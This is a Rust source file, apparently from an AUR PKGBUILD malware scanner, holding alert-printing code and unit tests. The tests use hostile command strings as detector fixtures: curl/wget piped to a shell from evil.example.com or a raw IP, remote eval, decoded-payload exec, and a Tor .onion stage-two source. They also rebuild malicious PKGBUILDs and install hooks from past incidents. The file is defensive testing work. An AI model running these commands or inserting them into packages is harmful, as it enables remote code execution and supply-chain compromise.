    let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
        .collect();
    let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::Suspicious)
        .collect();

    if !atomic.is_empty() {
        print_finding_block(pkgbase, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::LocalClone(dir));
    }
    if !suspicious.is_empty() {
        print_finding_block(pkgbase, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::LocalClone(dir));
    }

    eprintln!();
    eprintln!(
        "{} '{}''s cloned PKGBUILD/.install content (which differs from what was pre-scanned) \
        matches known-suspicious patterns. Review it yourself before proceeding:",
        ">>>".red().bold(),
        pkgbase
    );
    eprintln!("    {}", dir.display());
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    if !answer.trim().eq_ignore_ascii_case("y") {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }
}

/// Where the scanned source text came from -- controls only the trailing
/// "go read the full file yourself" link/path in `print_finding_block`.
pub(crate) enum SourceOrigin<'a> {
    /// Fetched via cgit, before any `git clone` happened.
    Cgit,
    /// Read straight from an on-disk clone at this directory.
    LocalClone(&'a std::path::Path),
}

/// Print one alert block in the emerge-style `>>> ===...` box.
///
/// `is_atomic` picks the color scheme: `true` (a confirmed IOC match
/// against a disclosed campaign, near-zero false-positive risk) uses
/// red/orange for a louder alert; `false` (generic heuristic hit) uses
/// yellow throughout.
///
/// Each finding line names the file and line it fired on; the block ends
/// with a way to go read each referenced file in full -- a cgit link for
/// `SourceOrigin::Cgit`, or the on-disk path for `SourceOrigin::LocalClone`.
pub(crate) fn print_finding_block(pkg: &str, headline: &str, findings: &[&(String, Finding)], is_atomic: bool, origin: SourceOrigin) {
    let bar = "===================================";
    let arrow_str = ">>>";

    eprintln!();
    if is_atomic {
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
        eprintln!("{} {}", arrow_str.red().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
    } else {
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
    }

    let arrow = || if is_atomic { arrow_str.truecolor(255, 140, 0).bold() } else { arrow_str.yellow().bold() };

    let mut files_seen: Vec<&str> = Vec::new();
    for (file, finding) in findings {
        let loc = if finding.line > 0 {
            format!("file {} line {}", file, finding.line)
        } else {
            format!("file {}", file)
        };
        eprintln!("{} {}: {}", arrow(), loc, finding.message);
        if !files_seen.contains(&file.as_str()) {
            files_seen.push(file.as_str());
        }
    }

    for file in files_seen {
        let anchor = findings.iter()
            .find(|(f, fi)| f == file && fi.line > 0)
            .map(|(_, fi)| format!("#n{}", fi.line))
            .unwrap_or_default();
        match &origin {
            SourceOrigin::Cgit => eprintln!(
                "{} Read full file: https://aur.archlinux.org/cgit/aur.git/tree/{}?h={}{}",
                arrow(), file, pkg, anchor
            ),
            SourceOrigin::LocalClone(dir) => eprintln!(
                "{} Read full file: {}",
                arrow(), dir.join(file).display()
            ),
        }
    }
}

#[cfg(test)]
mod scanner_tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_detected() {
        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
        assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
    }

    #[test]
    fn base64_decode_detected() {
        assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
        assert!(is_base64_decode("base64 --decode < blob.txt > out"));
        assert!(!is_base64_decode("makepkg --version"));
    }

    #[test]
    fn chmod_777_detected() {
        assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
        assert!(is_chmod_777("chmod -R 777 build/"));
        assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
    }

    #[test]
    fn raw_ipv4_detected() {
        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
        assert!(contains_raw_ipv4("192.168.1.1"));
        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
        assert!(!contains_raw_ipv4("no ip here at all"));
        // Known false positive, documented on contains_raw_ipv4: a 4-part
        // dotted version where every part is <= 255 reads as an IP too.
        assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
    }

    #[test]
    fn clean_pkgbuild_has_no_findings() {
        let src = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert!(scan_pkgbuild_source(src).is_empty());
    }

    #[test]
    fn validpgpkeys_single_line() {
        let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
        assert_eq!(parse_validpgpkeys(src), vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]);
    }

    #[test]
    fn validpgpkeys_multi_line_mixed_quotes() {
        let src = "validpgpkeys=('AAAA0123456789ABCDEF0123456789ABCDEF0123'\n              \"BBBB0123456789ABCDEF0123456789ABCDEF0123\")\n";
        assert_eq!(
            parse_validpgpkeys(src),
            vec![
                "AAAA0123456789ABCDEF0123456789ABCDEF0123",
                "BBBB0123456789ABCDEF0123456789ABCDEF0123"
            ]
        );
    }

    #[test]
    fn validpgpkeys_absent() {
        assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
    }

    #[test]
    fn known_malicious_package_detected() {
        assert_eq!(
            contains_known_malicious_package("npm install atomic-lockfile"),
            Some("atomic-lockfile")
        );
        assert_eq!(
            contains_known_malicious_package("bun install js-digest"),
            Some("js-digest")
        );
        assert_eq!(contains_known_malicious_package("npm install typescript"), None);
    }

    #[test]
    fn foreign_pkg_manager_install_detected() {
        assert!(is_foreign_pkg_manager_install("npm install atomic-lockfile"));
        assert!(is_foreign_pkg_manager_install("bun add js-digest"));
        assert!(is_foreign_pkg_manager_install("pip install requests"));
        // Local/project installs — no named external package — must NOT flag.
        assert!(!is_foreign_pkg_manager_install("npm install"));
        assert!(!is_foreign_pkg_manager_install("npm ci"));
        assert!(!is_foreign_pkg_manager_install("npm install ."));
        assert!(!is_foreign_pkg_manager_install("npm install --production"));
        assert!(!is_foreign_pkg_manager_install("yarn add ./vendor/local-pkg"));
    }

    #[test]
    fn parse_install_filename_variants() {
        assert_eq!(
            parse_install_filename("pkgname=foo\ninstall=foo.install\npkgver=1.0"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_filename("install='foo.install'"),
            Some("foo.install".to_string())
        );
        assert_eq!(parse_install_filename("# install=foo.install"), None);
        assert_eq!(parse_install_filename("pkgname=foo\npkgver=1.0"), None);
    }

    #[test]
    fn hex_escape_payload_detected() {
        assert!(is_hex_escape_payload(
            r#"printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/x"#
        ));
        // Legitimate hex doesn't use \x escapes: checksums, fingerprints, hashes.
        assert!(!is_hex_escape_payload(
            "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
        ));
        assert!(!is_hex_escape_payload(
            "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
        ));
        assert!(!is_hex_escape_payload("commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"));
        // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
        assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
    }

    #[test]
    fn strip_version_operator_variants() {
        assert_eq!(strip_version_operator("glibc>=2.38"), "glibc");
        assert_eq!(strip_version_operator("libc.so=6-64"), "libc.so");
        assert_eq!(strip_version_operator("bash"), "bash");
        assert_eq!(strip_version_operator("foo<=1.2"), "foo");
        assert_eq!(strip_version_operator("foo<1.2"), "foo");
    }

    #[test]
    fn parse_depends_on_basic() {
        let qi = "\
Name            : bash
Version         : 5.2.32-1
Description     : The GNU Bourne Again shell
Depends On      : readline  libc.so=6-64
Optional Deps   : None
Required By     : filesystem

Name            : coreutils
Version         : 9.5-1
Depends On      : glibc>=2.38  acl  attr
Required By     : base

Name            : filesystem
Version         : 2024.01-1
Depends On      : None
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["readline", "libc.so", "glibc", "acl", "attr"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_wrapped_continuation() {
        // Simulates pacman wrapping a long Depends On value onto a second,
        // indented line with no field label.
        let qi = "\
Name            : bigpkg
Version         : 1.0-1
Depends On      : dep-one  dep-two  dep-three
                  dep-four  dep-five
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["dep-one", "dep-two", "dep-three", "dep-four", "dep-five"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_none_and_missing_field() {
        let qi = "\
Name            : justapkg
Version         : 1.0-1
Depends On      : None
Required By     : None
";
        assert!(parse_depends_on_all(qi).is_empty());
    }

    #[test]
    fn atomic_arch_style_pkgbuild_and_install_flagged() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=totally-legit-tool.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        let install_hook = r#"
post_install() {
  npm install atomic-lockfile
}
"#;
        let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
        assert!(pkgbuild_findings.is_empty(), "clean PKGBUILD should have no findings on its own");

        assert_eq!(parse_install_filename(pkgbuild), Some("totally-legit-tool.install".to_string()));

        let install_findings = scan_pkgbuild_source(install_hook);
        assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
        assert!(install_findings.iter().any(|f| f.severity == Severity::ConfirmedIoc));
    }

    #[test]
    fn findings_carry_correct_line_numbers() {
        let src = "pkgname=foo\npkgver=1.0\nbuild() {\n  chmod 777 \"$pkgdir\"\n}\n";
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, 4);
        assert_eq!(findings[0].severity, Severity::Suspicious);
    }

    #[test]
    fn known_malicious_package_is_atomic_arch_severity() {
        let src = "post_install() {\n  npm install atomic-lockfile\n}\n";
        let findings = scan_pkgbuild_source(src);
        // Hits both the exact-IOC check (AtomicArch) and the generic
        // foreign-package-manager heuristic (Suspicious) on the same line.
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
    }

    #[test]
    fn malicious_pkgbuild_flagged() {
        let src = r#"
pkgname=evil
build() {
  curl -sSL http://185.220.101.5/stage2.sh | bash
  chmod 777 /tmp/evil
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 3);
    }

    // ── 2018 acroread/balz/minergate takeover ───────────────────────────
    //
    // Real incident: a hijacked orphaned AUR package fetched a persistence
    // script from a Pastebin raw URL and, once run, dropped a literal
    // `compromised.txt` marker into every home directory. Covered here by
    // two independent heuristics: the paste-site fetch (Suspicious, since
    // the mechanism alone has some legitimate uses) and the marker
    // filename itself (ConfirmedIoc, since there's no legitimate reason
    // for a PKGBUILD to reference it at all).

    #[test]
    fn paste_site_fetch_detected() {
        assert!(is_paste_site_fetch("curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"));
        assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
        assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
        assert!(!is_paste_site_fetch("curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"));
        assert!(!is_paste_site_fetch("# curl https://pastebin.com/raw/AbCd1234 (just a comment)"));
        // Mentioning a paste site without an actual fetch verb shouldn't fire.
        assert!(!is_paste_site_fetch("# see https://pastebin.com/raw/AbCd1234 for context"));
    }

    #[test]
    fn compromised_marker_detected() {
        assert!(has_compromised_marker("touch /compromised.txt"));
        assert!(has_compromised_marker("echo pwned > \"$HOME/compromised.txt\""));
        assert!(!has_compromised_marker("# compromised.txt was the 2018 marker file (comment only)"));
        assert!(!has_compromised_marker("this file is totally fine"));
    }

    #[test]
    fn acroread_2018_style_pkgbuild_flagged() {
        // Reconstructed shape of the real 2018 payload: fetch a script off
        // Pastebin and pipe it into the shell, which then drops the marker
        // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
        // (Suspicious), and — since the marker also happens to appear in
        // this build() — the exact-IOC check (ConfirmedIoc).
        let src = r#"
pkgname=acroread
build() {
  curl -sSL https://pastebin.com/raw/deadbeef | bash
  echo pwned > /compromised.txt
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc
            && f.message.contains("compromised.txt")));
        assert!(findings.iter().any(|f| f.message.contains("paste-dump site")));
        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
    }

    // ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
    //
    // Reported mechanism: a compromised package's build path added a
    // binary named `validator` and executed it with `sudo` during
    // packaging, reusing Tor-backed second-stage delivery from the June
    // 2026 Atomic Arch campaign.

    #[test]
    fn sudo_escalation_detected() {
        assert!(is_sudo_escalation("sudo ./validator --init"));
        assert!(is_sudo_escalation("pkexec /tmp/helper"));
        assert!(is_sudo_escalation("doas sh -c 'id'"));
        // Declaring sudo as a dependency, not invoking it, must not flag.
        assert!(!is_sudo_escalation("makedepends=('sudo')"));
        assert!(!is_sudo_escalation("depends=('sudo' 'other')"));
        assert!(!is_sudo_escalation("# sudo ./validator (just a comment)"));
        assert!(!is_sudo_escalation("build() {\n  make\n}"));
    }

    #[test]
    fn onion_address_detected() {
        assert!(is_onion_address(
            "source=(\"http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/stage2\")"
        ));
        assert!(is_onion_address("C2=abc123def456.onion"));
        assert!(!is_onion_address("# see the project's .onion mirror in the wiki (comment only)"));
        assert!(!is_onion_address("source=(\"https://github.com/foo/bar/archive/v1.tar.gz\")"));
    }

    #[test]
    fn known_malicious_hash_detected() {
        assert_eq!(
            contains_known_malicious_hash(
                "sha256sums=('e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77')"
            ),
            Some("e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77")
        );
        assert_eq!(
            contains_known_malicious_hash("sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"),
            None
        );
    }

    #[test]
    fn openconnect_sso_style_pkgbuild_flagged() {
        // Reconstructed shape of the reported incident: an adopted
        // package's build() gains a bundled `validator` binary and runs
        // it with sudo. Should trip the sudo-escalation heuristic
        // (Suspicious) — no ConfirmedIoc here since the binary name alone
        // isn't a matchable exact indicator, only the behavior is.
        let pkgbuild = r#"
pkgname=openconnect-sso
pkgver=0.13.0
pkgrel=2
source=("https://github.com/vlaci/openconnect-sso/archive/v$pkgver.tar.gz"
        "validator")
build() {
  cd "$pkgname-$pkgver"
  sudo ./validator --setup
  make
}
"#;
        let findings = scan_pkgbuild_source(pkgbuild);
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious
            && f.message.contains("sudo/pkexec/doas")));
    }

    // ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────

    #[test]
    fn curl_pipe_absolute_path_shell_detected() {
        assert!(is_curl_pipe_shell("wget -O- https://evil.example.com/x | /bin/sh"));
        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | /usr/bin/bash"));
        assert!(is_curl_pipe_shell("wget -qO- https://evil.example.com/x | env bash"));
        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | env -S sh"));
        // still shouldn't false-positive on a plain download-to-file
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o /usr/bin/foo"));
    }

    // ── eval $(curl ...) ──────────────────────────────────────────────

    #[test]
    fn eval_remote_exec_detected() {
        assert!(is_eval_remote_exec(r#"eval "$(curl -sSL https://evil.example.com/x)""#));
        assert!(is_eval_remote_exec("eval `wget -qO- https://evil.example.com/x`"));
        // bare eval on a local variable/array must not flag
        assert!(!is_eval_remote_exec("eval \"${some_array[@]}\""));
        assert!(!is_eval_remote_exec("# eval \"$(curl https://evil.example.com/x)\" (comment)"));
    }

    // ── python -c exec/eval + openssl decrypt ────────────────────────────

    #[test]
    fn python_inline_exec_detected() {
        assert!(is_python_inline_exec(
            "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
        ));
        assert!(is_python_inline_exec("python -c 'os.system(\"id\")'"));
        // python -c doing something benign shouldn't flag
        assert!(!is_python_inline_exec("python3 -c 'print(1+1)'"));
        assert!(!is_python_inline_exec("python3 setup.py build"));
    }

    #[test]
    fn openssl_decrypt_detected() {
        assert!(is_openssl_decrypt("openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"));
        assert!(is_openssl_decrypt("openssl aes-256-cbc -d -in blob -out out"));
        // encrypting (not decrypting) or unrelated openssl calls shouldn't flag
        assert!(!is_openssl_decrypt("openssl enc -aes-256-cbc -in payload -out payload.enc"));
        assert!(!is_openssl_decrypt("openssl dgst -sha256 foo.tar.gz"));
    }

    // ── install=${pkgname}.install resolution ────────────────────────────

    #[test]
    fn resolve_install_filename_interpolated() {
        let src = "pkgname=foo\ninstall=${pkgname}.install\npkgver=1.0\n";
        assert_eq!(resolve_install_filename(src), Some("foo.install".to_string()));

        let src2 = "pkgname=bar\ninstall=$pkgname.install\npkgver=1.0\n";
        assert_eq!(resolve_install_filename(src2), Some("bar.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_literal_unchanged() {
        let src = "pkgname=foo\ninstall=custom-hook.install\n";
        assert_eq!(resolve_install_filename(src), Some("custom-hook.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_pkgbase_split_package() {
        let src = "pkgbase=mysuite\npkgname=(mysuite-a mysuite-b)\ninstall=${pkgbase}.install\n";
        assert_eq!(resolve_install_filename(src), Some("mysuite.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_unresolvable_bails() {
        // pkgname is an array (split package) and install= references it —
        // no single value to substitute, must return None rather than a
        // garbage filename that would 404 anyway.
        let src = "pkgname=(a b)\ninstall=${pkgname}.install\n";
        assert_eq!(resolve_install_filename(src), None);
    }

    #[test]
    fn atomic_arch_style_pkgbuild_with_interpolated_install_still_caught() {
        // Same shape as atomic_arch_style_pkgbuild_and_install_flagged above,
        // but with the realistic ${pkgname}.install form instead of the
        // literal name — this is the case that used to silently skip the
        // install hook entirely.
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=${pkgname}.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        assert_eq!(
            resolve_install_filename(pkgbuild),
            Some("totally-legit-tool.install".to_string())
        );
    }

    #[test]
    fn ast_catches_concatenation_evasion_line_heuristic_would_miss() {
        // `s""h` is bash string concatenation for the literal shell name
        // "sh" at runtime, but no single token in the source text equals
        // "sh" for a naive line-based grep to match. The AST path (tried
        // first in scan_pkgbuild_source) resolves the concatenation and
        // still catches it.
        let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
    }
}